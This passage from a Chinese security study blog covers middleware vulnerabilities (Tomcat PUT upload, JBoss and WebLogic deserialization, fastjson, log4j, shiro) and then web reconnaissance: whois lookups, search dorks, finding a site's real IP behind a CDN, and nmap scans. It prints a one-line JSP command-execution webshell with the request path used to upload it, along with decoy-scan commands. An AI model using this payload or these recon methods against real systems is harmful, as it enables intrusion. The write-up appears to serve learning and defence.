<p>a&#x2F;</p>
<p>b&#x2F;</p>
<p>c&#x2F;</p>
<p>可以点击第一行，访问其它目录页面</p>
<h4 id="防御-12"><a href="#防御-12" class="headerlink" title="防御"></a>防御</h4><p>Nginx的配置文件&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;error2.conf的&#x2F;files使用&#x2F;闭合。</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p>
<p>Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
<h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><h4 id="成因-11"><a href="#成因-11" class="headerlink" title="成因"></a>成因</h4><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
<p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
<h4 id="利用-11"><a href="#利用-11" class="headerlink" title="利用"></a>利用</h4><p>请求方式改为put</p>
<p>url参数为：&#x2F;122.jsp%20 HTTP&#x2F;1.1</p>
<p>上传post参数为<code>&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;</code></p>
<h4 id="防御-13"><a href="#防御-13" class="headerlink" title="防御"></a>防御</h4><p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p>
<p>2）更新并升级至最新版。</p>
<h3 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h3><p>在后台上传包含后门的war包</p>
<h2 id="jBoss"><a href="#jBoss" class="headerlink" title="jBoss"></a>jBoss</h2><p>jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><h4 id="成因-12"><a href="#成因-12" class="headerlink" title="成因"></a>成因</h4><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
<h4 id="利用-12"><a href="#利用-12" class="headerlink" title="利用"></a>利用</h4><p>访问&#x2F;invoker&#x2F;readonly。</p>
<p>返回500，说明页面存在，此页面有反序列化漏洞</p>
<p>刷新，改包：请求方式为post，请求数据为右键-&gt;paste from file-&gt;payload.bin</p>
<h4 id="防御-14"><a href="#防御-14" class="headerlink" title="防御"></a>防御</h4><p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p>
<p>2）用于对 httpinvoker 组件进行访问控制。</p>
<h3 id="war后门文件部署-1"><a href="#war后门文件部署-1" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h3><h2 id="webLogic"><a href="#webLogic" class="headerlink" title="webLogic"></a>webLogic</h2><p>基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<h3 id="反序列化-1"><a href="#反序列化-1" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="利用-13"><a href="#利用-13" class="headerlink" title="利用"></a>利用</h4><p>vulhub</p>
<h4 id="防御-15"><a href="#防御-15" class="headerlink" title="防御"></a>防御</h4><p>升级补丁</p>
<h3 id="SSRF-1"><a href="#SSRF-1" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="成因-13"><a href="#成因-13" class="headerlink" title="成因"></a>成因</h4><p>利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><h3 id="war后门文件部署-2"><a href="#war后门文件部署-2" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h3><h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>开源JSON解析库，它<strong>可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean</strong>。Fastjson<strong>存在远程代码执行漏洞，autotype开关的限制可以被绕过</strong>，链式的反序列化攻击者精心构造反序列化利用链，最终达成远程命令执行的后果。此漏洞本身无法绕过Fastjson的黑名单限制，需要配合不在黑名单中的反序列化利用链才能完成完整的漏洞利用。</p>
<blockquote>
<p>根本原因<code>还是Fastjson的</code>autotype<code>功能，此功能可以反序列化的时候人为指定精心设计的类，达成</code>远程<code>命令</code>执行</p>
</blockquote>
<h3 id="AutoType功能"><a href="#AutoType功能" class="headerlink" title="AutoType功能"></a>AutoType功能</h3><p>使用各种Json序列化工具的时候，其实在序列化之后很多情况是没有包含任何类信息的，如:</p>
<blockquote>
<p>{“fruit”:{“name”:”apple”},”mode”:”online”}</p>
</blockquote>
<p>使用时有两种方式：直接转为一个JSONObject，然后通过key值取对应的数据；另外一种就是指定需要转换的对象：</p>
<p><code>public static &lt;T&gt; T parseObject(String text, Class&lt;T&gt; clazz)</code></p>
<blockquote>
<p>将给定的文本（text）解析为指定的类（clazz）的对象，并返回解析后的对象。该方法使用了泛型（Generic）来实现通用性。</p>
</blockquote>
<p>这样可以直接拿到类对象。</p>
<p>然而由于业务中多态的需求，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//水果接口类</span><br><span class="line">public interface Fruit &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//通过指定的方式购买水果</span><br><span class="line">public class Buy &#123;</span><br><span class="line">    private String mode;</span><br><span class="line">    private Fruit fruit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//具体的水果类--苹果</span><br><span class="line">public class Apple implements Fruit &#123;</span><br><span class="line">    private String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果只是序列化为没有类信息的json字符串，那么其中的Fruit就无法识别具体的类：</p>
<blockquote>
<p> String jsonString &#x3D; “{“fruit”:{“name”:”apple”},”mode”:”online”}”;</p>
<p> Buy newBuy &#x3D; JSON.parseObject(jsonString, Buy.class);</p>
<p> Apple newApple &#x3D; (Apple) newBuy.getFruit();</p>
</blockquote>
<p>这种情况下直接强转直接报<code>ClassCastException</code>异常；</p>
<p><strong>为此FastJson引入了autotype功能，：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apple apple = new Apple();</span><br><span class="line">apple.setName(&quot;apple&quot;);</span><br><span class="line">Buy buy = new Buy(&quot;online&quot;, apple);</span><br><span class="line">String jsonString2 = JSON.toJSONString(buy, SerializerFeature.WriteClassName);</span><br></pre></td></tr></table></figure>

<p><strong>在序列化的时候指定<code>SerializerFeature.WriteClassName</code>即可</strong>，这样序列化之后的json字符串如下所示：</p>
<p>{“@type”:”com.fastjson.Buy”,”fruit”:{“@type”:”com.fastjson.impl.Apple”,”name”:”apple”},”mode”:”online”}</p>
<p>这样在反序列化的时候就可以转成具体的实现类；但是就是因为在json字符串中包含了类信息，给了<code>黑客攻击</code>的可能。</p>
<h2 id="fastjson攻击"><a href="#fastjson攻击" class="headerlink" title="fastjson攻击"></a>fastjson攻击</h2><p>当 Fastjson 在反序列化过程中遇到带有 <code>@type</code> 属性的 JSON 字符串时，它会自动根据 <code>@type</code> 属性的值创建对应的 Java 对象</p>
<p>攻击者可以构造一个带有恶意 <code>@type</code> 属性的 JSON 字符串，并将其传递给 Fastjson 进行反序列化。当 Fastjson 反序列化该 JSON 字符串时，它会实例化恶意的 Java 类，并执行其中的恶意代码，从而导致远程代码执行漏洞。</p>
<p>比如 当我们使用 Fastjson 的 <code>JSON.parseObject()</code> 方法对该 JSON 字符串进行反序列化时，Fastjson 会自动创建一个 <code>com.example.EvilClass</code> 的对象，并执行其构造函数中的恶意代码。</p>
<h2 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h2><p>即java的一个日志框架。主要是由于JNDI的查找功能。</p>
<p>log4j在解析特定的日志消息时，会自动执行JNDI查找，攻击者通过构造恶意的 JNDI 地址，其可能指向一个恶意的 LDAP 服务器，攻击者可以在该服务器上设置特殊的响应，以触发远程代码执行。</p>
<h2 id="shiro原理"><a href="#shiro原理" class="headerlink" title="shiro原理"></a>shiro原理</h2><p>开源的Java安全框架，用于身份认证、授权和会话管理等安全功能</p>
<ul>
<li>shiro默认使用了CookieRememberMeManager，其处理cookie的流程是：得到rememberMe的cookie值–&gt;Base64解码–&gt;AES解密–&gt;反序列化 然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</li>
</ul>
<p>3.fastjson ，log4j，shiro原理</p>
<p>5.linux查看进程命令，linux有哪些日志文件，在什么位置</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>漏洞</category>
        <category>中间件漏洞</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>目录遍历/穿越</tag>
        <tag>war后门</tag>
        <tag>端口漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>用户视角下的信息探测</title>
    <url>/2023/06/11/%E7%94%A8%E6%88%B7%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E4%BF%A1%E6%81%AF%E6%8E%A2%E6%B5%8B/</url>
    <content><![CDATA[<h1 id="1-whois信息"><a href="#1-whois信息" class="headerlink" title="1.whois信息"></a>1.whois信息</h1><p>首先，获得了域名。比如<a href="http://www.baidu.com./">www.baidu.com。</a></p>
<blockquote>
<p>域名由DNS服务器负责解析，并告知用户浏览器目标站点的IP地址。域名均由域名提供商对公众开放，可由个人或企业出资购买，获得域名的使用权。</p>
</blockquote>
<p>whois是用来查询域名的IP以及所有者等信息的传输协议。</p>
<p>通过whois可以查出目标域名是否被注册以及注册域名所有人的详细信息。</p>
<blockquote>
<p>whois信息中包含了注册商、注册人、注册人邮箱、域名注册日期、域名到期日期等信息。可以看到，其中的大量信息均为真实信息，并且这些信息对外公开。但某些情况下，域名所有人并不希望自己的注册信息被他人获取，如从事部分灰色产业的人员或者个人特定应用等。这种情况下，域名所有人可开启隐私保护功能，实现对个人信息的保护。</p>
</blockquote>
<p>当然了，隐私保护是一项增殖业务，如果账户欠费或转让，当前域名状态就失去了保护，所以查询当前域名的历史whois信息，可能获取其中的有效内容。</p>
<p>whois信息的作用非常大，比如可利用其对应的注册信息进行反向查询，发现当前域名所有者其他的域名情况，在针对某些站点进行特征追踪时效果良好。</p>
<p>如利用注册人邮箱实现whois信息反查。</p>
<p>也许可以看到，相同的邮箱注册了多个域名。再尝试访问这些域名。</p>
<blockquote>
<p>综上所述，针对要防护的目标站点，域名的whois信息作为攻击者最先获得的内容，可从中找到域名所有人的基础信息，如姓名、常用邮箱、电话等。以常用邮箱为例，攻击者有可能将邮箱信息放入<strong>社工库</strong>进行查询，以获得更广泛的信息，甚至可能发现此邮箱对应的活动内容以及当前邮箱在其他地点（很多站点支持邮箱作为用户名来注册）所用的密码等内容，这将对后续的攻击过程提供非常大的便利。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618153333278.png" alt="whois信息攻击方式"></p>
<h1 id="2-利用搜索引擎发现敏感信息"><a href="#2-利用搜索引擎发现敏感信息" class="headerlink" title="2.利用搜索引擎发现敏感信息"></a>2.利用搜索引擎发现敏感信息</h1><p>这个过程中极少与站点产生交互行为，也就有了很好的隐蔽措施。</p>
<p>通过搜索引擎的基本语法及搜索思路展开测试。</p>
<h2 id="1-常用操作符"><a href="#1-常用操作符" class="headerlink" title="1.常用操作符"></a>1.常用操作符</h2><p>搜索引擎会支持多种类型的操作符，以方便用户对目标信息进行更精确的查找。这也就为攻击者提供了信息查询的方便。目前主流的搜索引擎的查询语法中，常用的操作符有以下几种：</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>联合查询</td>
</tr>
<tr>
<td>-</td>
<td>忽略某个字</td>
</tr>
<tr>
<td>*</td>
<td>通配符，可代表多个字母</td>
</tr>
<tr>
<td>.</td>
<td>单一通配符</td>
</tr>
<tr>
<td>“ ”</td>
<td>精准查询</td>
</tr>
<tr>
<td>~</td>
<td>同义词</td>
</tr>
</tbody></table>
<h2 id="2-inurl"><a href="#2-inurl" class="headerlink" title="2.inurl"></a>2.inurl</h2><p>用于搜索在目标URL中出现关键字的信息。</p>
<blockquote>
<p>想查询格式为php的管理页面，其关键字为“admin”“php”。这时，可利用空格方式进行连接，如“inurl php id”，从而实现匹配url中的所有关键字。</p>
</blockquote>
<p><code>inurl admin</code>这种一般就是找后台</p>
<p>所以要么通过隐藏后台，要么添加允许连接IP的白名单等手段来提升安全性。</p>
<h2 id="3-title"><a href="#3-title" class="headerlink" title="3.title"></a>3.title</h2><p>关键字“tittle管理后台”、“tittle人员信息”</p>
<h2 id="4-filetype"><a href="#4-filetype" class="headerlink" title="4.filetype"></a>4.filetype</h2><p>用于指定查询文件的后缀名，如bak、sql、ini、xls、htaccess等。</p>
<blockquote>
<p>一般来说，这类信息涉及站点的备份信息、数据库信息、表格等内容。假设管理员没有及时删除，并且此信息恰好被搜索引擎收录，则会展示相应的结果。这类敏感信息会使攻击者更全面地了解目标站点的特征及有效内容。</p>
</blockquote>
<h2 id="5-site"><a href="#5-site" class="headerlink" title="5.site"></a>5.site</h2><p>site用于在指定网站内搜索有效信息，可直接使用“site：域名+关键字”来查找当前目标站点中指定的内容信息。</p>
<blockquote>
<p>如site:<a href="http://www.baidu.com/">www.baidu.com</a> asddasads</p>
</blockquote>
<h2 id="6-cache"><a href="#6-cache" class="headerlink" title="6.cache"></a>6.cache</h2><p>利用搜索引擎之前缓存的信息进行查询。利用搜索引擎之前缓存的信息进行查询。</p>
<h2 id="7-daterange"><a href="#7-daterange" class="headerlink" title="7.daterange"></a>7.daterange</h2><p>使用daterange关键词指定搜索的日期。但此方法使用起来比较麻烦，并且目前主流的搜索引擎均都自带时间控制，可在搜索引擎的筛选栏中选择所需要的部分。</p>
<h2 id="综合利用搜索引擎"><a href="#综合利用搜索引擎" class="headerlink" title="综合利用搜索引擎"></a>综合利用搜索引擎</h2><h3 id="1-使用缓存匿名浏览"><a href="#1-使用缓存匿名浏览" class="headerlink" title="1.使用缓存匿名浏览"></a>1.使用缓存匿名浏览</h3><p>利用缓存可以看到更新之前的页面，也可以匿名获取到网站服务器的数据拷贝（在此必须要选择只查看文本，不然仍会向服务器发送访问请求）。</p>
<p><code>cache:xxx.com/xxx.html</code></p>
<p>这样做的优点是：目标网站并没有真实的访问记录，只是在搜索引擎缓存的数据中进行查询。在某些特定场景，如APT攻击中，可能会有较大的用途。</p>
<h3 id="2-获取特殊信息"><a href="#2-获取特殊信息" class="headerlink" title="2.获取特殊信息"></a>2.获取特殊信息</h3><p>网站上线后并没有将原有的备份文件或SQL文件删除，还存在于网站的目录中。这样会导致网站的某些重要的信息隐藏在某个页面的角落里，使用搜索引擎可以高效地查找这些信息，使用filetype：sql或者ini、bak、log等还可以查找网站的隐私文件。</p>
<p><code>site:XXX.cn fi letype:sql</code></p>
<p>.bak这类属于备份文件</p>
<blockquote>
<p>site: xxx.com filetype:xls</p>
<p>“site powered by limbo cms” site:”xxx.com”</p>
</blockquote>
<p>搜索引擎可帮助更多用户了解及访问网站，但是其中的信息也会被搜索引擎收录。</p>
<p>作为系统管理员的话，也可以定期搜索网站特定内容，对重要信息进行处理，避免被攻击者发现。</p>
<h3 id="3-后台管理页面、目录列表或特殊页面"><a href="#3-后台管理页面、目录列表或特殊页面" class="headerlink" title="3.后台管理页面、目录列表或特殊页面"></a>3.后台管理页面、目录列表或特殊页面</h3><h4 id="后台管理页面"><a href="#后台管理页面" class="headerlink" title="后台管理页面"></a>后台管理页面</h4><p>如果攻击者发现<strong>后台登录页面</strong>，第一反应就是采取<strong>爆破</strong>等手段进行攻击，或者在<strong>前台利用SQL注入、XSS存储跨站</strong>等手段获取管理员账号信息后进行登录。因此，后台管理页面应尽量不被攻击者发现。</p>
<h4 id="目录列表"><a href="#目录列表" class="headerlink" title="目录列表"></a><strong>目录列表</strong></h4><p>正常情况下，访问一个网站会发起一个HTTP请求，Web服务器会根据请求中的URL路径来响应对应的页面。因此，用户每一次访问的页面应该只是服务器Web目录的某个页面或文件（如PDF等格式）。但是，如果Web服务器存在目录列举的问题，可<strong>导致用户端直接观察到当前目录的所有文件及结构</strong>，这样会极大暴露目标站点的信息。</p>
<p><code>intitle:index of &quot;server at&quot;</code></p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618184526853.png"></p>
<p>列目录在文件服务器中非常常见，可方便用户快速寻找所需要的文件并下载。但针对普通站点来说，如果可看到站点的相关的目录，攻击者就可快速了解站点结构，并且可对其中的重要文件或页面进行下载，</p>
<h4 id="专项搜索用法汇总"><a href="#专项搜索用法汇总" class="headerlink" title="专项搜索用法汇总"></a>专项搜索用法汇总</h4><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618184743922.png"></p>
<p>Zoome eye搜索</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618185621268.png"></p>
<h1 id="3-真实IP地址发现手段"><a href="#3-真实IP地址发现手段" class="headerlink" title="3.真实IP地址发现手段"></a>3.真实IP地址发现手段</h1><p>出现域名与真实IP不对应的情况。这主要是Web站点为了提高用户的访问速度，使用了CDN（内容分发网络）技术。</p>
<blockquote>
<p>CDN的特点是可以将内容在本地展示，并配合CDN的网络在全国各地做内容缓存分发。这样，用户直接访问的域名对应的IP地址为CDN地址，而非目标Web站点的真实地址。当初步获取到目标IP地址后，可利用目前互联网上的CDN地址段查询接口确认当前访问的地址是否为CDN。</p>
</blockquote>
<p>获取目标Web系统的真实IP地址经常利用的方式如下。</p>
<h2 id="1-查找分站的IP"><a href="#1-查找分站的IP" class="headerlink" title="1.查找分站的IP"></a>1.查找分站的IP</h2><p>由于CDN为收费服务，部分网站的某些分站由于访问量较小，因此选择仅在主站上配置CDN服务器，而分站并不配置。因此，可以遍历目标站点的分站地址，并找到分站地址对应的IP，再通过扫描C段的80端口，从而找到主站的IP地址。</p>
<blockquote>
<p>C段是指IPv4地址中的第三个部分，通常用于标识特定的网络。例如，在地址192.168.0.0&#x2F;24中，C段是0，表示这个地址是一个属于C段的地址。子网掩码是24</p>
<p>之所以是C段扫描，是因为范围更小，就2^8&#x3D;256-2&#x3D;254个主机地址，更具有针对性，资源消耗也少</p>
</blockquote>
<p>如果此网站有邮件服务器且没有使用公共SMTP服务器，也可以尝试DNS的MX记录，很多时候也会有相应收获。</p>
<h2 id="2-尝试服务器主动发起联系"><a href="#2-尝试服务器主动发起联系" class="headerlink" title="2.尝试服务器主动发起联系"></a>2.尝试服务器主动发起联系</h2><p>让服务器主动联系，就可以轻松知道服务器的IP地址。比如，服务器发送注册或者验证码邮件，在邮件头就可以知道IP地址。但目前有很多第三方验证码及验证邮件发送平台，因此需对这种方式下得到的地址进行后续人工判断，确认地址归属。</p>
<h2 id="3-ping-xxx"><a href="#3-ping-xxx" class="headerlink" title="3.ping xxx"></a>3.ping xxx</h2><p>很多人喜欢使用xxx.com（裸域）访问网站，所以部分网站为了给用户良好的体验并且不让搜索引擎认为域名已被劫持，通常都是给xxx.com（裸域）使用301重定向至<a href="http://www.xxx.com.xxx.com与www.xxx.com是不同的两条解析记录,很可能存在xxx.com没有使用cdn的情况./">www.xxx.com。xxx.com与www.xxx.com是不同的两条解析记录，很可能存在xxx.com没有使用CDN的情况。</a></p>
<blockquote>
<p>C:\Users\67538&gt;ping <a href="http://www.baidu.com/">www.baidu.com</a></p>
<p>正在 Ping <a href="http://www.a.shifen.com/">www.a.shifen.com</a> [36.152.44.96] 具有 32 字节的数据:<br>来自 36.152.44.96 的回复: 字节&#x3D;32 时间&#x3D;34ms TTL&#x3D;56<br>来自 36.152.44.96 的回复: 字节&#x3D;32 时间&#x3D;32ms TTL&#x3D;56</p>
</blockquote>
<blockquote>
<p>C:\Users\67538&gt;ping baidu.com</p>
<p>正在 Ping baidu.com [39.156.66.10] 具有 32 字节的数据:<br>来自 39.156.66.10 的回复: 字节&#x3D;32 时间&#x3D;51ms TTL&#x3D;53<br>来自 39.156.66.10 的回复: 字节&#x3D;32 时间&#x3D;51ms TTL&#x3D;53</p>
</blockquote>
<p>可看到直接ping <a href="http://www.baidu.com返回的是www.a.shifen.com,这是百度的一个别名,用以提升各地用户的访问速度./">www.baidu.com返回的是www.a.shifen.com，这是百度的一个别名，用以提升各地用户的访问速度。</a></p>
<h2 id="4-phpinfo"><a href="#4-phpinfo" class="headerlink" title="4.phpinfo"></a>4.phpinfo</h2><p>phpinfo包含了当前服务器的真实信息</p>
<h2 id="5-XSS"><a href="#5-XSS" class="headerlink" title="5.XSS"></a>5.XSS</h2><p>如果目标站点存在存储型XSS攻击漏洞，那么就可利用XSS漏洞实现针对真实IP地址的发现。在实际情况中，如果管理员打开特殊构造的页面，且管理员与服务器在同一个网段，再结合扫描即可找到真实IP。</p>
<p>但JavaScript本身并没有获取本地IP地址的能力，一般需要第三方软件来完成。比如，客户端安装了Java环境（JRE），那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。在XSS攻击框架“Attack API”中，就有一个获取本地IP地址的API。</p>
<p>这样做的好处在于可以由服务器主动响应攻击代码，并自动发送真实IP地址。但是使用环境较为苛刻，必须要求有存储型XSS漏洞，且漏洞会被管理员或者内部人员触发。</p>
<p>当然了，既然存储型XSS漏洞存在的话，一般是直接利用存储型XSS漏洞<strong>获取管理员权限</strong>，<strong>并寻找后台地址进行登录尝试</strong>。</p>
<blockquote>
<p>知道管理员的账号和密码的前提下，获取到cookie，然后放到请求头中，发给服务器。</p>
</blockquote>
<h2 id="6-全网扫描"><a href="#6-全网扫描" class="headerlink" title="6.全网扫描"></a>6.全网扫描</h2><p>利用分布式扫描工具进行全网扫描，并进行特征分析及提取，进而确定目标的真实地址。</p>
<p>1）找到开启了80端口的主机。</p>
<p>2）找到host为<a href="http://www.xxx.com的ip./">www.xxx.com的IP。</a></p>
<p>3）再扫一次抓取特征，通过去除错误页面、空页面等方法得到真实IP。</p>
<p>在这个过程中，会进行大量的端口扫描，因此对带宽占用非常大，并且大量发包在现有网络中会被认为攻击行为。但这是一种有效寻找目标真实IP的方法。</p>
<h2 id="7-CDN服务商"><a href="#7-CDN服务商" class="headerlink" title="7.CDN服务商"></a>7.CDN服务商</h2><p>如果知道目标站点的CND服务商，那么可想办法进入CDN服务商的管理后台得到真实IP，如利用管理员的弱密码等。通常的方式是利用管理员的公共信息，并在社工库中进行查询，以寻找是否有弱密码等。这种方式的成功率不高，但也确实存在此类场景。</p>
<h2 id="方法总结"><a href="#方法总结" class="headerlink" title="方法总结"></a>方法总结</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618191939335.png" alt="获取真实ip方法总结"></p>
<h1 id="4-真实物理地址"><a href="#4-真实物理地址" class="headerlink" title="4.真实物理地址"></a>4.真实物理地址</h1><p>国内大量的IP地址只能分配到一个物理社区或单位，并在网关处利用私网地址来通过当前的物理地址进行网络访问。</p>
<p>正是基于这种状况，目前真实地理位置查询仅能追查到公网IP地址的分配点上，也就是共用同一个IP地址的社区或单位。</p>
<blockquote>
<p>下面提供了一些目前有效的查询网址：</p>
<p>·<a href="http://ip.chacuo.net/">http://ip.chacuo.net</a></p>
<p>·<a href="http://www.ipip.net/">http://www.ipip.net</a></p>
<p>·<a href="http://ip.chinaz.com/">http://ip.chinaz.com</a></p>
<p>·<a href="http://ip.qq.com/cgi-bin">http://ip.qq.com/cgi-bin</a></p>
<p>·<a href="http://iptogeo.sinaapp.com/">http://iptogeo.sinaapp.com</a></p>
<p>·<a href="http://ip.taobao.com/index.php">http://ip.taobao.com/index.php</a></p>
<p>·<a href="http://ip.taobao.com/service/getIpInfo.php">http://ip.taobao.com/service/getIpInfo.php</a></p>
<p>·<a href="http://int.dpool.sina.com.cn/iplookup/iplookup.php">http://int.dpool.sina.com.cn/iplookup/iplookup.php</a></p>
</blockquote>
<p>当然弄了，实际攻击过程中，发现真实物理地址并没有太多价值。如果要跑到服务器所在地，当地连WIFI或社工手段的话，也不是不行。</p>
<h1 id="5-目标端口开放情况"><a href="#5-目标端口开放情况" class="headerlink" title="5.目标端口开放情况"></a>5.目标端口开放情况</h1><p>这里所说的端口是指TCP&#x2F;IP协议支持的0～65535端口，可采用TCP UDP方式来传输数据。</p>
<p>在Web应用中，HTTP协议默认利用TCP80端口，HTTPS协议默认利用443端口进行数据传输。</p>
<p>一般情况下，常利用NMAP进行端口扫描。目前也有像ZMAP等新兴工具，metaspoilt也可用于端口扫描，大量漏洞扫描工具均有此类功能。</p>
<p>NMAP比较常用，以NMAP为例</p>
<blockquote>
<p>利用NMAP可扫描目标的端口开放情况、对应版本、操作系统等多种信息。NMAP可扫描目标站点的端口开放情况及对应业务，</p>
</blockquote>
<h2 id="1-获取远程主机的系统类型及开放端口"><a href="#1-获取远程主机的系统类型及开放端口" class="headerlink" title="1.获取远程主机的系统类型及开放端口"></a>1.获取远程主机的系统类型及开放端口</h2><p><code>Nmap -sS -P0 -sV -O &lt;target&gt;</code></p>
<blockquote>
<p>这里的&lt;target&gt;可以是单一IP或主机名、域名、子网。其中参数的意义为：</p>
<p>·-sS：进行TCP SYN扫描（又称半连接扫描）。</p>
<p>·-P0：允许用户关闭ICMP pings。</p>
<p>·-sV：打开系统版本检测。</p>
<p>·-O：尝试识别远程操作系统。</p>
<p>除此之外，还可以添加其他选项，实现信息的多方面输出：</p>
<p>·-A：同时打开操作系统指纹和版本检测。</p>
<p>·-v：详细输出扫描情况。</p>
</blockquote>
<h2 id="2-列出开放了指定端口的主机列表"><a href="#2-列出开放了指定端口的主机列表" class="headerlink" title="2.列出开放了指定端口的主机列表"></a>2.列出开放了指定端口的主机列表</h2><p><code>nmap -sT -p 80 -oG – 192.168.1.* | grep open</code></p>
<h2 id="3-在局域网络寻找所有在线主机"><a href="#3-在局域网络寻找所有在线主机" class="headerlink" title="3.在局域网络寻找所有在线主机"></a>3.在局域网络寻找所有在线主机</h2><p><code>nmap -sP 192.168.0.*</code></p>
<p>也可使用以下命令：</p>
<p><code>nmap -sP 192.168.0.0/24</code></p>
<p>这里的*（星号）表示该位为1～254，&#x2F;24代表子网掩码。</p>
<h2 id="4-Ping指定范围内的IP地址"><a href="#4-Ping指定范围内的IP地址" class="headerlink" title="4.Ping指定范围内的IP地址"></a>4.Ping指定范围内的IP地址</h2><p><code>nmap -sP 192.168.1.100-254</code></p>
<h2 id="5-在某段子网上查找未占用的IP"><a href="#5-在某段子网上查找未占用的IP" class="headerlink" title="5.在某段子网上查找未占用的IP"></a>5.在某段子网上查找未占用的IP</h2><p><code>nmap -T4 -sP 192.168.2.0/24 &amp;&amp; egrep &quot;00:00:00:00:00:00&quot; /proc/net/arp</code></p>
<h2 id="6-使用诱饵扫描方法来扫描主机端口"><a href="#6-使用诱饵扫描方法来扫描主机端口" class="headerlink" title="6.使用诱饵扫描方法来扫描主机端口"></a>6.使用诱饵扫描方法来扫描主机端口</h2><p><code>nmap –sS 192.168.0.10 –D 192.168.0.2</code></p>
<h2 id="常用端口扫描汇总"><a href="#常用端口扫描汇总" class="headerlink" title="常用端口扫描汇总"></a>常用端口扫描汇总</h2><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618192936959.png"></p>
<h1 id="6-目标版本特征发现"><a href="#6-目标版本特征发现" class="headerlink" title="6.目标版本特征发现"></a>6.目标版本特征发现</h1><p>中间件版本等信息对攻击者来说非常重要，攻击者会利用获取的目标中间件信息来寻找合适的渗透手段。</p>
<p>通常，攻击者在观察目标时，会利用非正常手段导致目标报错，诱使目标返回错误页面。中间件默认的错误页面中多包含中间版版本等信息。</p>
<p>对用户而言，他们没有必要知道当前服务器的版本信息、报错等内容。因此不推荐输出这些内容。建议隐藏这类中间版本，报错直接给个404就完事了。</p>
<p>多数情况下，运维人员会修改默认的错误页面，或者强制访问错误后直接跳转到首页或断开当前连接。这样就可以防止攻击者通过观察报错页面得到站点的基本信息。这种情况下，可利用扫描工具（如NMAP）进行尝试，也可发现目标的一些中间件特征。</p>
<blockquote>
<p>其原理就是获取目标服务器的响应包头，并针对其中的<strong>server字段</strong>信息进行判断。大多数中间件都会在server字段中填写当前服务器的版本内容。</p>
</blockquote>
<h1 id="7-web漏扫工具"><a href="#7-web漏扫工具" class="headerlink" title="7.web漏扫工具"></a>7.web漏扫工具</h1><p>使用Web漏洞扫描工具的好处在于其检查速度及范围远远高于人工检查，并且可同时针对多个站点进行扫描，对效率提升有极大帮助。</p>
<p>其缺点在于，Web漏洞扫描器并不能完全发现所有漏洞，对很多隐藏很深的漏洞会出现误报及漏报的情况。因此，Web扫描器并非万能。攻击者通常<strong>先利用Web漏洞扫描器</strong>进行初步、全面的探测，之后再利用<strong>人工</strong>方式针对疑似点进行进一步渗透尝试。</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230618193311361.png"></p>
